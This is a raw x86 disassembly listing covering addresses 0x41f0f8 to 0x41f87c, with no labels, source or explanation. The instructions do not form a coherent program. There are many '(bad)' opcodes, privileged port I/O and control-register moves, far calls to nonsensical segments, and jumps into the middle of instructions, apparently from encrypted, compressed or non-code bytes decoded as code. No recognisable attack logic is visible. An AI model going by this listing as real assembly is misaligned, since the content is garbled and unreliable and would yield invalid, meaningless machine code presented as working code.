  41f0f8:	neg    edi
  41f0fa:	test   al,0xb1
  41f0fc:	add    eax,0xb31b06e6
  41f101:	adc    BYTE PTR [ecx+0xc],cl
  41f104:	loopne 0x41f151
  41f106:	jecxz  0x41f0f7
  41f108:	adc    eax,0xa1cad8dd
  41f10d:	lds    ebp,FWORD PTR [edi]
  41f10f:	clc    
  41f110:	cmp    ebp,DWORD PTR [eax+0x2a83711a]
  41f116:	fsub   QWORD PTR [esi-0x68a4bbef]
  41f11c:	add    ah,al
  41f11e:	das    
  41f11f:	cmp    BYTE PTR ss:[ebx-0x53],dh
  41f123:	dec    ebp
  41f124:	sub    al,0xca
  41f126:	fdiv   st,st(4)
  41f128:	cmp    eax,0x353be4d5
  41f12d:	or     ch,BYTE PTR [esi]
  41f12f:	cmp    DWORD PTR [esi-0x74b4e059],0xe647330e
  41f139:	lods   eax,DWORD PTR ds:[esi]
  41f13a:	xlat   BYTE PTR ds:[ebx]
  41f13b:	das    
  41f13c:	jae    0x41f0cc
  41f13e:	dec    ebx
  41f13f:	push   sp
  41f141:	xor    al,0x89
  41f143:	je     0x41f0f4
  41f145:	pop    esp
  41f146:	mov    esi,0xbff65939
  41f14b:	cmp    al,0x65
  41f14d:	sahf   
  41f14e:	retf   0xdec3
  41f151:	mov    DWORD PTR [eax],ebp
  41f153:	out    dx,al
  41f154:	in     al,0x6f
  41f156:	and    esp,DWORD PTR [eax]
  41f158:	dec    esp
  41f159:	lahf   
  41f15a:	jns    0x41f1a9
  41f15c:	xor    esp,DWORD PTR ds:0xaefa871
  41f162:	outs   dx,BYTE PTR ds:[esi]
  41f163:	dec    edi
  41f164:	jg     0x41f1bb
  41f166:	retf   
  41f167:	es out 0xf7,eax
  41f16a:	jl     0x41f19b
  41f16c:	jl     0x41f10d
  41f16e:	dec    esi
  41f16f:	arpl   WORD PTR [eax],bx
  41f171:	repnz dec ebx
  41f173:	jns    0x41f12d
  41f175:	mov    edi,0xb225ce5f
  41f17a:	dec    ecx
  41f17b:	(bad)  
  41f17c:	call   0x4d49:0xe18eafbe
  41f183:	cli    
  41f184:	cmp    esi,DWORD PTR [eax]
  41f186:	aaa    
  41f187:	sub    al,0x5a
  41f189:	push   ds
  41f18a:	adc    al,0xbe
  41f18c:	in     al,0x25
  41f18e:	sbb    al,ah
  41f190:	cmp    BYTE PTR [esi+0x98c5628],ch
  41f196:	aas    
  41f197:	lahf   
  41f198:	into   
  41f199:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f19a:	jmp    0x41f20f
  41f19c:	lock fld DWORD PTR ds:0x8198bb6c
  41f1a3:	cmp    bh,cl
  41f1a5:	push   0x5031fab
  41f1aa:	mov    DWORD PTR [ebx],ebx
  41f1ac:	shl    BYTE PTR [eax+0x48d5b0c6],cl
  41f1b2:	inc    esp
  41f1b3:	push   es
  41f1b4:	outs   dx,DWORD PTR ds:[esi]
  41f1b5:	xchg   edx,eax
  41f1b6:	sbb    BYTE PTR [ebp+0x35],0x1a
  41f1ba:	xchg   dh,ch
  41f1bc:	sbb    BYTE PTR [esi-0x44c7bffd],ch
  41f1c2:	in     al,dx
  41f1c3:	pop    edi
  41f1c4:	push   eax
  41f1c5:	and    ecx,DWORD PTR [ecx+0x75fab4cc]
  41f1cb:	cmp    DWORD PTR [ebx+ebx*2],0xe188a322
  41f1d2:	cmp    al,0xbf
  41f1d4:	cld    
  41f1d5:	xor    al,0xcc
  41f1d7:	sbb    al,0x28
  41f1d9:	mov    ah,0x9f
  41f1db:	nop
  41f1dc:	inc    edx
  41f1dd:	and    eax,0x41ac4a32
  41f1e2:	jl     0x41f1b3
  41f1e4:	dec    esp
  41f1e5:	loopne 0x41f1db
  41f1e7:	fild   WORD PTR [ebx]
  41f1e9:	sub    al,0x78
  41f1eb:	cmp    al,0xf2
  41f1ed:	jbe    0x41f241
  41f1ef:	push   edx
  41f1f0:	imul   ecx,DWORD PTR [edx+0x34],0x74
  41f1f4:	hlt    
  41f1f5:	arpl   WORD PTR [ebx-0x7],cx
  41f1f8:	pop    esp
  41f1f9:	nop
  41f1fa:	fsub   QWORD PTR [edx]
  41f1fc:	ja     0x41f1af
  41f1fe:	pop    es
  41f1ff:	psllw  mm5,QWORD PTR [ebx+0x72522845]
  41f206:	jmp    0xe851:0x441f3813
  41f20d:	mov    dh,0xea
  41f20f:	outs   dx,BYTE PTR ds:[esi]
  41f210:	mov    ebx,0x1072071c
  41f215:	add    eax,0x34ac882b
  41f21a:	loop   0x41f1bc
  41f21c:	or     eax,0x6fb93a8a
  41f221:	pushf  
  41f222:	xchg   BYTE PTR [edx+0x37786009],ch
  41f228:	xor    BYTE PTR [edi],bh
  41f22a:	sbb    ecx,ecx
  41f22c:	xchg   ebx,eax
  41f22d:	rol    DWORD PTR [ebx-0x60],0x55
  41f231:	pop    ds
  41f232:	retf   0x41b1
  41f235:	test   al,0xb0
  41f237:	(bad)  
  41f238:	rcr    DWORD PTR [edi-0x63],1
  41f23b:	(bad)  
  41f23c:	mov    edi,0xc295b414
  41f241:	dec    eax
  41f242:	out    dx,eax
  41f243:	xchg   edi,eax
  41f244:	jge    0x41f2a1
  41f246:	aad    0x8c
  41f248:	lock pop ecx
  41f24a:	in     eax,dx
  41f24b:	cs aas 
  41f24d:	or     al,0x7b
  41f24f:	arpl   WORD PTR [ebx-0x6f],di
  41f252:	(bad)  
  41f253:	and    bh,al
  41f255:	add    DWORD PTR [esi+0xc],ebx
  41f258:	call   0xc87b:0x2735e772
  41f25f:	adc    edx,esi
  41f261:	mov    ds:0x4f208fb7,eax
  41f266:	sbb    al,0x1f
  41f268:	add    BYTE PTR [ebp+0x783d086c],al
  41f26e:	scas   eax,DWORD PTR es:[edi]
  41f26f:	mul    esp
  41f271:	neg    BYTE PTR [edx+0xf82921e]
  41f277:	ds adc bh,cl
  41f27a:	iret   
  41f27b:	push   es
  41f27c:	cmp    ah,dl
  41f27e:	in     al,0x86
  41f280:	dec    esi
  41f281:	jmp    0x7a5d:0xd1c7b7ff
  41f288:	jle    0x41f2cf
  41f28a:	test   bl,ch
  41f28c:	rol    BYTE PTR [esi-0x5fa3e733],0xf
  41f293:	pop    esp
  41f294:	inc    eax
  41f295:	xor    esp,esi
  41f297:	ins    BYTE PTR es:[edi],dx
  41f298:	call   0x48fd:0x8130e650
  41f29f:	adc    bh,bl
  41f2a1:	push   esp
  41f2a2:	pop    ss
  41f2a3:	mov    eax,0x5a2d539a
  41f2a8:	cmp    eax,0x9ffb4166
  41f2ad:	retf   0xed93
  41f2b0:	jecxz  0x41f26e
  41f2b2:	pushf  
  41f2b3:	jno    0x41f257
  41f2b5:	sub    BYTE PTR [esi+0x24],dh
  41f2b8:	popf   
  41f2b9:	adc    BYTE PTR [edx-0x39],al
  41f2bc:	fld    TBYTE PTR [esp+ebp*2-0x23]
  41f2c0:	std    
  41f2c1:	or     DWORD PTR [ecx+ecx*2+0x1],ecx
  41f2c5:	pushf  
  41f2c6:	cmp    eax,0x4e66a626
  41f2cb:	inc    edx
  41f2cc:	out    0xea,al
  41f2ce:	fwait
  41f2cf:	add    eax,0x64f5fd90
  41f2d4:	mov    esi,0xbb0588cc
  41f2d9:	cld    
  41f2da:	out    0xe7,eax
  41f2dc:	rcl    DWORD PTR [eax-0x399eb0f2],0xb4
  41f2e3:	loop   0x41f271
  41f2e5:	ret    
  41f2e6:	fbld   TBYTE PTR [ecx]
  41f2e8:	xor    DWORD PTR [ebx],edx
  41f2ea:	xor    al,0xdf
  41f2ec:	ins    BYTE PTR es:[edi],dx
  41f2ed:	cdq    
  41f2ee:	sub    DWORD PTR [ecx+eiz*1+0x61],esp
  41f2f2:	fadd   QWORD PTR [ecx+0x7f]
  41f2f5:	pop    ebx
  41f2f6:	daa    
  41f2f7:	lods   eax,DWORD PTR ds:[esi]
  41f2f8:	(bad)  
  41f2f9:	fcomp  QWORD PTR [ebp+0x13]
  41f2fc:	jno    0x41f379
  41f2fe:	push   0x7d
  41f300:	mov    DWORD PTR ds:0x98aae867,ebx
  41f306:	repnz fwait
  41f308:	xor    al,0x1
  41f30a:	sub    dh,ch
  41f30c:	in     eax,0x50
  41f30e:	push   eax
  41f30f:	rcr    DWORD PTR [ebx],0x17
  41f312:	repnz xor edi,ecx
  41f315:	daa    
  41f316:	jae    0x41f315
  41f318:	ds je  0x41f368
  41f31b:	and    DWORD PTR [ebp+0x13589339],ebp
  41f321:	xlat   BYTE PTR ds:[ebx]
  41f322:	dec    ecx
  41f323:	inc    esi
  41f324:	(bad)  
  41f325:	lods   al,BYTE PTR ds:[esi]
  41f326:	cmp    DWORD PTR [ebp+0x44],ecx
  41f329:	inc    eax
  41f32a:	inc    edi
  41f32b:	jbe    0x41f325
  41f32d:	mov    ebx,0x8af6dfc6
  41f332:	stos   DWORD PTR es:[edi],eax
  41f333:	les    esp,FWORD PTR [edi]
  41f335:	clc    
  41f336:	in     al,0x8d
  41f338:	lahf   
  41f339:	mov    BYTE PTR [edi+0x2c],0xdf
  41f33d:	jae    0x41f3a2
  41f33f:	ins    DWORD PTR es:[edi],dx
  41f340:	adc    dl,BYTE PTR [edx-0xf7dd633]
  41f346:	push   eax
  41f347:	mov    ds:0xda4117b4,al
  41f34c:	or     dh,dl
  41f34e:	ret    
  41f34f:	mov    bh,0x13
  41f351:	lods   eax,DWORD PTR ds:[esi]
  41f352:	lods   al,BYTE PTR ds:[esi]
  41f353:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f354:	dec    ebp
  41f355:	mov    ebx,0x80b4f17e
  41f35a:	and    al,0xf9
  41f35c:	fucomp st(4)
  41f35e:	fmul   DWORD PTR [ecx-0x42]
  41f361:	cdq    
  41f362:	call   0x7452:0xace7e67c
  41f369:	stos   DWORD PTR es:[edi],eax
  41f36a:	jmp    0x41f3b0
  41f36c:	adc    BYTE PTR [eax+edi*2-0x72],cl
  41f370:	and    dl,BYTE PTR [edi-0x3f6b333e]
  41f376:	pusha  
  41f377:	cmp    eax,0x93df61b1
  41f37c:	dec    ebp
  41f37d:	sub    BYTE PTR [edi],bh
  41f37f:	sahf   
  41f380:	shl    DWORD PTR [ebp+0x3e079da2],cl
  41f386:	push   es
  41f387:	and    al,dl
  41f389:	test   al,0x76
  41f38b:	or     ch,BYTE PTR [ebp-0x38]
  41f38e:	aam    0xb0
  41f390:	int    0x44
  41f392:	adc    al,cl
  41f394:	test   eax,0xc1c65a18
  41f399:	pop    edi
  41f39a:	cld    
  41f39b:	xchg   ebp,eax
  41f39c:	dec    esp
  41f39d:	mov    dh,0x99
  41f39f:	bound  esp,QWORD PTR [eax-0x38]
  41f3a2:	jg     0x41f354
  41f3a4:	std    
  41f3a5:	pushf  
  41f3a6:	leave  
  41f3a7:	mov    ah,0x19
  41f3aa:	and    al,0x49
  41f3ac:	dec    BYTE PTR [edi+0x468b39bd]
  41f3b2:	stos   BYTE PTR es:[edi],al
  41f3b3:	add    bl,BYTE PTR [eax-0x1e]
  41f3b6:	or     eax,0x941c2e84
  41f3bb:	retf   0x9242
  41f3be:	cmp    edi,esp
  41f3c0:	dec    esi
  41f3c1:	imul   eax,DWORD PTR [ebp-0x2edb287a],0x9d9da69c
  41f3cb:	in     eax,dx
  41f3cc:	sub    dh,BYTE PTR [esi+0x2577d613]
  41f3d2:	es mov ebx,0xec593592
  41f3d8:	mov    ebx,0x8d4c14a3
  41f3dd:	sub    eax,DWORD PTR [edi+0x63]
  41f3e0:	bound  esi,QWORD PTR [edi-0x5]
  41f3e3:	ins    BYTE PTR es:[edi],dx
  41f3e4:	mov    bh,0x32
  41f3e6:	pushf  
  41f3e7:	ins    BYTE PTR es:[edi],dx
  41f3e8:	sub    al,0xa2
  41f3ea:	pushf  
  41f3eb:	mov    al,0xf0
  41f3ed:	inc    ebp
  41f3ee:	mov    BYTE PTR [ecx+eiz*1+0x16],ah
  41f3f2:	adc    DWORD PTR [esi-0xc],esi
  41f3f5:	push   0xffffffad
  41f3f7:	call   0x1301:0xf4143674
  41f3fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3ff:	jecxz  0x41f3f7
  41f401:	mov    es,WORD PTR [edx]
  41f403:	jle    0x41f477
  41f405:	retf   0x156d
  41f408:	mov    eax,0x3d72d992
  41f40d:	mov    fs,ecx
  41f40f:	jns    0x41f3f5
  41f411:	mov    eax,ds:0x49b4ac7f
  41f416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f417:	xor    BYTE PTR [ebx-0x3cf17081],dl
  41f41d:	xor    dh,BYTE PTR [ebp+0x2324a72f]
  41f423:	lock scas eax,DWORD PTR es:[edi]
  41f425:	fwait
  41f426:	mov    DWORD PTR [edi],esi
  41f428:	mov    ecx,0x28e585b4
  41f42d:	out    dx,eax
  41f42e:	test   BYTE PTR [eax+0x3ba1e524],al
  41f434:	psubw  mm3,QWORD PTR [esi-0xdcde36c]
  41f43b:	addr16 push cs
  41f43d:	jg     0x41f4aa
  41f43f:	xor    BYTE PTR [esi],ch
  41f441:	(bad)
  41f445:	mov    bh,0xa0
  41f447:	adc    esp,eax
  41f449:	cmc    
  41f44a:	call   DWORD PTR [ecx]
  41f44c:	retf   
  41f44d:	rol    DWORD PTR [edx],cl
  41f44f:	push   cs
  41f450:	scas   eax,DWORD PTR es:[edi]
  41f451:	push   edx
  41f452:	mov    dl,0xc0
  41f454:	data16 add ch,BYTE PTR [ebx]
  41f457:	inc    ecx
  41f458:	ds aas 
  41f45a:	pop    edi
  41f45b:	push   ss
  41f45c:	cdq    
  41f45d:	(bad)  
  41f45e:	int    0x97
  41f460:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f461:	into   
  41f462:	loopne 0x41f4b7
  41f464:	test   al,0xe2
  41f466:	shl    DWORD PTR [ecx+0x3a96e4af],cl
  41f46c:	sub    ah,cl
  41f46e:	iret   
  41f46f:	push   eax
  41f470:	ins    BYTE PTR es:[edi],dx
  41f471:	push   ebp
  41f472:	mov    eax,0xe17da3a5
  41f477:	pop    esp
  41f478:	adc    BYTE PTR [edx-0x1c1703ff],0xdf
  41f47f:	lahf   
  41f480:	out    0x13,al
  41f482:	mov    cl,0x77
  41f484:	repz pushf 
  41f486:	fwait
  41f487:	cld    
  41f488:	loopne 0x41f45e
  41f48a:	popa   
  41f48b:	adc    BYTE PTR [ebx+0x30502042],al
  41f491:	ins    BYTE PTR es:[edi],dx
  41f492:	das    
  41f493:	sub    al,0x11
  41f495:	jbe    0x41f468
  41f497:	mov    edi,0xd5e27fbe
  41f49c:	clc    
  41f49d:	xchg   ebx,eax
  41f49e:	add    eax,0xa9651996
  41f4a3:	lds    ax,DWORD PTR [ebp-0x7e551d52]
  41f4aa:	or     DWORD PTR [edx],eax
  41f4ac:	loop   0x41f42f
  41f4ae:	(bad)  
  41f4af:	loope  0x41f462
  41f4b1:	cmp    ebx,DWORD PTR [edx-0x27]
  41f4b4:	inc    edx
  41f4b5:	test   BYTE PTR [edx-0xf38ada8],bh
  41f4bb:	sbb    eax,0xb0165d95
  41f4c0:	pop    esi
  41f4c1:	popa   
  41f4c2:	fisubr WORD PTR [ebp-0x23]
  41f4c5:	popa   
  41f4c6:	or     eax,0xef95a1ff
  41f4cb:	sbb    eax,0xc75b122a
  41f4d0:	jmp    0x41f523
  41f4d2:	add    eax,0xbcf2b66d
  41f4d7:	and    al,0x1b
  41f4d9:	cmp    ah,BYTE PTR [eax+0x574c52d3]
  41f4df:	jecxz  0x41f532
  41f4e1:	dec    edx
  41f4e2:	pop    ss
  41f4e3:	xor    cl,BYTE PTR [edi-0x20e78222]
  41f4e9:	xor    eax,0xc9bbc258
  41f4ee:	push   es
  41f4ef:	mov    eax,ds:0xe0a6435a
  41f4f4:	jecxz  0x41f487
  41f4f6:	mov    bl,0x19
  41f4f8:	xchg   edx,eax
  41f4f9:	jbe    0x41f513
  41f4fb:	sub    al,0x7e
  41f4fd:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41f4ff:	es dec edi
  41f501:	mov    ds,esi
  41f503:	sbb    BYTE PTR [ebx+0x4e84b5c3],al
  41f509:	iret   
  41f50a:	sub    eax,0xdf540461
  41f50f:	test   al,0x5a
  41f511:	add    ch,BYTE PTR [edx-0x64]
  41f514:	fucomp st(7)
  41f516:	and    al,0xb4
  41f518:	sbb    edx,eax
  41f51a:	dec    eax
  41f51b:	ja     0x41f4b4
  41f51d:	mov    BYTE PTR [esi-0x3e],0x34
  41f521:	out    dx,eax
  41f522:	dec    ebx
  41f523:	mov    eax,ds:0x8e2fbe0a
  41f528:	push   ss
  41f529:	and    eax,0x2dc95bb1
  41f52e:	pop    esi
  41f52f:	or     esp,DWORD PTR [ebx+0x5e]
  41f532:	cmp    eax,0xd1f3a73f
  41f537:	sbb    BYTE PTR [edi+0x7e9a4067],dh
  41f53d:	sbb    eax,0x6552f9a7
  41f542:	inc    edi
  41f543:	and    eax,0xb38529dc
  41f548:	sub    BYTE PTR [ebp-0x22],ch
  41f54b:	pop    es
  41f54c:	adc    esi,DWORD PTR [edx+0x31303cbe]
  41f552:	test   BYTE PTR [ebx-0x29],al
  41f555:	scas   eax,DWORD PTR es:[edi]
  41f556:	adc    ch,BYTE PTR [edi+0x6f3f96fb]
  41f55c:	and    BYTE PTR [edx],cl
  41f55e:	add    cl,ch
  41f560:	test   dh,bh
  41f562:	lods   eax,DWORD PTR ds:[esi]
  41f563:	cld    
  41f564:	pusha  
  41f565:	xchg   edx,eax
  41f567:	or     eax,0x81fe7124
  41f56c:	nop
  41f56d:	test   BYTE PTR [ecx-0x8],cl
  41f570:	xor    bh,BYTE PTR [ebx+esi*1+0x7e9033c7]
  41f577:	pop    ds
  41f578:	in     al,dx
  41f579:	or     BYTE PTR [ebp+0x6a142b8f],0xb2
  41f580:	xchg   edi,eax
  41f581:	test   eax,0x5954db4
  41f586:	push   eax
  41f587:	jg     0x41f558
  41f589:	in     al,dx
  41f58a:	je     0x41f54c
  41f58c:	pop    eax
  41f58d:	shr    BYTE PTR [edx],0xc9
  41f590:	mov    ebp,0x1f5ef0c3
  41f595:	test   bh,cl
  41f597:	out    dx,eax
  41f598:	fstp   QWORD PTR [ebx+0x79eee9c1]
  41f59e:	(bad)  
  41f59f:	fisttp WORD PTR [ebx+eiz*8+0x39]
  41f5a3:	int3   
  41f5a4:	scas   al,BYTE PTR es:[edi]
  41f5a5:	mov    al,BYTE PTR [ebx+0x51]
  41f5a8:	pop    esi
  41f5a9:	les    esi,FWORD PTR [eax+0x57]
  41f5ac:	js     0x41f5c9
  41f5ae:	scas   al,BYTE PTR es:[edi]
  41f5af:	jo     0x41f62e
  41f5b1:	cdq    
  41f5b2:	xchg   ecx,eax
  41f5b3:	mov    al,0x9c
  41f5b5:	dec    edi
  41f5b6:	ins    DWORD PTR es:[edi],dx
  41f5b7:	and    DWORD PTR [ebx+0x65a7758c],ecx
  41f5bd:	sub    cl,BYTE PTR [edx-0x5cc7b28e]
  41f5c3:	retf   0x9686
  41f5c6:	dec    esi
  41f5c7:	cli    
  41f5c8:	or     BYTE PTR [ebp-0x1d432808],cl
  41f5ce:	cmp    al,0x39
  41f5d0:	lock dec ebp
  41f5d2:	mov    edx,cr5
  41f5d5:	jne    0x41f5eb
  41f5d7:	mov    eax,0x9eebd405
  41f5dc:	sbb    cl,dl
  41f5de:	ret    0xb1ad
  41f5e1:	cmp    eax,0xd961a9fd
  41f5e6:	mov    cl,0xb
  41f5e8:	mov    al,0xe5
  41f5ea:	rcl    eax,0xcf
  41f5ed:	mov    eax,0xdb2322e8
  41f5f2:	xchg   edx,eax
  41f5f3:	call   0x6c886255
  41f5f8:	push   esi
  41f5f9:	dec    edi
  41f5fa:	fld    TBYTE PTR [eax-0x3febbfd6]
  41f600:	cmp    edi,DWORD PTR [ebp-0x2fa60fe9]
  41f606:	cmc    
  41f607:	mov    bl,0x4b
  41f609:	scas   al,BYTE PTR es:[edi]
  41f60a:	popf   
  41f60b:	or     ecx,DWORD PTR [eax-0x20]
  41f60e:	fimul  DWORD PTR [edx]
  41f610:	sub    DWORD PTR [ebx+0x7499089a],ecx
  41f616:	jno    0x41f642
  41f618:	test   BYTE PTR ds:0x80379fe5,bl
  41f61e:	and    BYTE PTR [ecx+ecx*4-0x145cba4c],dh
  41f625:	scas   eax,DWORD PTR es:[edi]
  41f626:	mov    esp,0xe5633f2
  41f62b:	fisttp DWORD PTR [eax+ebx*1+0x7024fde4]
  41f632:	popf   
  41f633:	xchg   ecx,eax
  41f634:	xchg   esp,ebp
  41f636:	repnz scas eax,DWORD PTR es:[edi]
  41f638:	sub    BYTE PTR [ecx+0x4b807cbb],0x94
  41f63f:	and    al,0x4d
  41f641:	popf   
  41f642:	popa   
  41f643:	fild   WORD PTR es:[edi-0x4a]
  41f647:	leave  
  41f648:	aam    0x6
  41f64a:	ins    DWORD PTR es:[edi],dx
  41f64b:	adc    cl,BYTE PTR [eax]
  41f64d:	mov    cl,0x53
  41f64f:	inc    ebx
  41f650:	popa   
  41f651:	or     BYTE PTR [esi+0x23],dh
  41f654:	ss cld 
  41f656:	out    dx,eax
  41f657:	and    al,0x3d
  41f659:	fsubr  QWORD PTR [esp+ebx*2-0x7]
  41f65d:	inc    ebp
  41f65e:	jbe    0x41f60a
  41f660:	out    0xe6,eax
  41f662:	arpl   WORD PTR [esi+ebp*8-0x49],bx
  41f666:	sub    DWORD PTR [esi-0x5f],0x2e
  41f66a:	pushf  
  41f66b:	sbb    al,BYTE PTR ds:0xfc5e21af
  41f671:	and    eax,0x9dc29432
  41f676:	mov    ebx,0x8efbc4c4
  41f67b:	mov    eax,ds:0xbf172c03
  41f680:	and    BYTE PTR [ecx+0x41],cl
  41f683:	sub    DWORD PTR ds:0xccec0c33,ebp
  41f689:	dec    esp
  41f68a:	ins    BYTE PTR es:[edi],dx
  41f68b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f68c:	aaa    
  41f68d:	ror    BYTE PTR [edi-0x5a1d6084],1
  41f693:	sbb    dh,BYTE PTR ds:0x5941aab7
  41f699:	and    esp,edx
  41f69b:	outs   dx,DWORD PTR ds:[esi]
  41f69c:	in     al,dx
  41f69d:	outs   dx,BYTE PTR ds:[esi]
  41f69e:	xor    bl,dh
  41f6a0:	jb     0x41f688
  41f6a2:	call   FWORD PTR [edx+0x2adfaf22]
  41f6a8:	xchg   esi,eax
  41f6a9:	sbb    DWORD PTR [esi],esi
  41f6ab:	push   cs
  41f6ac:	repnz sbb edi,esp
  41f6af:	scas   al,BYTE PTR es:[edi]
  41f6b0:	push   ss
  41f6b1:	pop    esp
  41f6b2:	pop    esi
  41f6b3:	dec    eax
  41f6b4:	jmp    0x41f6bb
  41f6b6:	jo     0x41f710
  41f6b8:	pop    ebx
  41f6b9:	cmp    al,0x4d
  41f6bb:	ja     0x41f69c
  41f6bd:	mov    WORD PTR [edi+ebx*2],ds
  41f6c0:	mov    bh,0x31
  41f6c2:	ja     0x41f706
  41f6c4:	xor    eax,0xab2e23c
  41f6c9:	mov    dl,0x3
  41f6cb:	xchg   esp,eax
  41f6cc:	add    DWORD PTR [ebp-0x3c],esp
  41f6cf:	jmp    0x41f702
  41f6d1:	cdq    
  41f6d2:	pop    esi
  41f6d3:	cmp    BYTE PTR [eax],al
  41f6d5:	pop    edx
  41f6d6:	rcl    DWORD PTR [edx-0x58],0xa4
  41f6da:	rcr    BYTE PTR [edx-0x10022c91],0x8d
  41f6e1:	out    dx,al
  41f6e2:	dec    ecx
  41f6e3:	gs loope 0x41f6ea
  41f6e6:	loop   0x41f6a1
  41f6e8:	inc    eax
  41f6e9:	jle    0x41f6e0
  41f6eb:	jno    0x41f71a
  41f6ed:	add    BYTE PTR ds:0x6a9db8,cl
  41f6f3:	push   ebx
  41f6f4:	dec    edi
  41f6f5:	in     al,0xfe
  41f6f7:	sub    dl,dh
  41f6f9:	push   edi
  41f6fa:	ret    0xfc22
  41f6fd:	inc    eax
  41f6fe:	into   
  41f6ff:	inc    eax
  41f700:	inc    ecx
  41f701:	or     al,0x45
  41f703:	(bad)  
  41f704:	mov    esp,0x184a502e
  41f709:	cmp    ch,BYTE PTR [edx]
  41f70b:	jns    0x41f698
  41f70d:	pop    esi
  41f70e:	xchg   DWORD PTR [eax+0x32faff7a],esp
  41f714:	fiadd  WORD PTR [eax]
  41f716:	repz lahf 
  41f718:	sub    esp,DWORD PTR [eax+0x68ab8471]
  41f71e:	ud2    
  41f720:	mov    ch,0xbd
  41f722:	cmp    edx,DWORD PTR [ebp+0x6a3049ac]
  41f728:	ret    0xe05c
  41f72b:	sti    
  41f72c:	div    bh
  41f72e:	lock dec edx
  41f730:	sar    BYTE PTR [ecx-0x6ae60a32],0x34
  41f737:	mov    cl,BYTE PTR [ebx]
  41f739:	xor    ah,BYTE PTR [ebx]
  41f73b:	or     DWORD PTR [esi+0x23cc83fe],edx
  41f741:	clc    
  41f742:	cmovb  esi,DWORD PTR [ebx+0x5b]
  41f746:	js     0x41f70e
  41f748:	push   cs
  41f749:	push   esi
  41f74a:	push   ds
  41f74b:	imul   ecx,eax,0x6b8d0fc1
  41f751:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f752:	inc    ebp
  41f753:	test   al,0xc4
  41f755:	int    0x37
  41f757:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f758:	jmp    0x41f71d
  41f75a:	ins    BYTE PTR es:[edi],dx
  41f75b:	int3   
  41f75c:	sub    eax,0xb0433688
  41f761:	or     al,0x98
  41f763:	(bad)  
  41f764:	mov    WORD PTR [ecx+0x6caa0a9e],?
  41f76a:	pop    edi
  41f76b:	leave  
  41f76c:	test   DWORD PTR [eax+0x21d68592],0xf28d28d8
  41f776:	addr16 adc eax,0x652df588
  41f77c:	mov    ah,0xa4
  41f77e:	mov    eax,0x73c7d796
  41f783:	cmp    DWORD PTR [ebx-0x5799af51],esp
  41f789:	cmp    eax,0xda2ebf38
  41f78e:	stos   BYTE PTR es:[edi],al
  41f78f:	in     eax,0xd4
  41f791:	pop    edx
  41f792:	xchg   esi,eax
  41f793:	add    bh,BYTE PTR [edx]
  41f795:	sbb    DWORD PTR [edi],0x3ecccc31
  41f79b:	dec    eax
  41f79c:	adc    DWORD PTR [esi],ecx
  41f79e:	adc    al,0x6f
  41f7a0:	jmp    0xc13d:0x377051f5
  41f7a7:	adc    bh,bh
  41f7a9:	mov    cl,0x99
  41f7ab:	lock mov al,ds:0x6f5a596
  41f7b1:	test   ecx,0x772a276
  41f7b7:	outs   dx,BYTE PTR ds:[esi]
  41f7b8:	(bad)  
  41f7b9:	xchg   ecx,eax
  41f7ba:	add    DWORD PTR [edi+0x697b978c],ebx
  41f7c0:	pop    ss
  41f7c1:	pop    edx
  41f7c2:	(bad)  
  41f7c3:	sbb    eax,0xa6e67de5
  41f7c8:	mov    eax,0xd6969c9
  41f7cd:	call   0x1431:0x923f0718
  41f7d4:	mov    edi,0x85ac0b36
  41f7d9:	adc    al,0x1f
  41f7db:	push   ds
  41f7dc:	mov    ds:0x9a95789e,al
  41f7e1:	sbb    eax,0x7dae1d90
  41f7e6:	jno    0x41f7a1
  41f7e8:	add    edi,0x78edce6d
  41f7ee:	mov    dh,0x67
  41f7f0:	dec    ebx
  41f7f1:	mov    edi,edx
  41f7f3:	call   0x1bb7:0x807169d4
  41f7fa:	dec    eax
  41f7fb:	lods   eax,DWORD PTR ds:[esi]
  41f7fc:	add    BYTE PTR [edx],ah
  41f7fe:	sub    DWORD PTR [edi],edx
  41f800:	out    dx,al
  41f801:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f802:	jl     0x41f7ef
  41f804:	pop    esp
  41f805:	mov    bh,dh
  41f807:	pusha  
  41f808:	or     ebp,DWORD PTR [ebx-0x7ae62e3b]
  41f80e:	inc    ecx
  41f80f:	mov    edx,0xa292d3d0
  41f814:	ja     0x41f79c
  41f816:	lea    esi,[edi+esi*8+0x3b]
  41f81a:	adc    al,0xd9
  41f81c:	inc    ebx
  41f81d:	je     0x41f7cf
  41f81f:	retf   
  41f820:	adc    ecx,DWORD PTR [eax-0x6cdae792]
  41f826:	jg     0x41f7d4
  41f828:	fwait
  41f829:	cs xchg edi,eax
  41f82b:	dec    edx
  41f82c:	stos   BYTE PTR es:[edi],al
  41f82d:	dec    esp
  41f82e:	fmul   st,st(0)
  41f830:	dec    edi
  41f831:	xor    BYTE PTR [eax-0x4f],ah
  41f834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f835:	call   0xc3d7194f
  41f83a:	push   DWORD PTR [esi]
  41f83c:	xor    ah,BYTE PTR [eax+0x2c7fbff1]
  41f842:	jle    0x41f7e5
  41f844:	test   dl,0x83
  41f847:	mov    ebp,DWORD PTR [edx-0x3a]
  41f84a:	popf   
  41f84b:	outs   dx,BYTE PTR ds:[esi]
  41f84c:	mov    eax,ds:0x560a9bb9
  41f851:	das    
  41f852:	xchg   ebp,eax
  41f853:	and    esi,DWORD PTR [ebx-0x1b]
  41f856:	mov    dh,0xfc
  41f858:	out    0x8d,eax
  41f85a:	xor    bh,0xdd
  41f85d:	mov    ah,0xaf
  41f85f:	or     edi,edi
  41f861:	aas    
  41f862:	loopne 0x41f830
  41f864:	push   ebp
  41f865:	jne    0x41f8bd
  41f867:	(bad)  
  41f868:	mov    esi,0xf1945ccd
  41f86d:	sbb    al,0x2b
  41f86f:	dec    ebp
  41f870:	xchg   ebx,eax
  41f871:	lods   al,BYTE PTR ds:[esi]
  41f872:	dec    ecx
  41f873:	xor    esp,DWORD PTR [ebx+eax*8]
  41f876:	jae    0x41f8e7
  41f878:	repz adc edx,DWORD PTR [edi-0x1b]
  41f87c:	lahf   
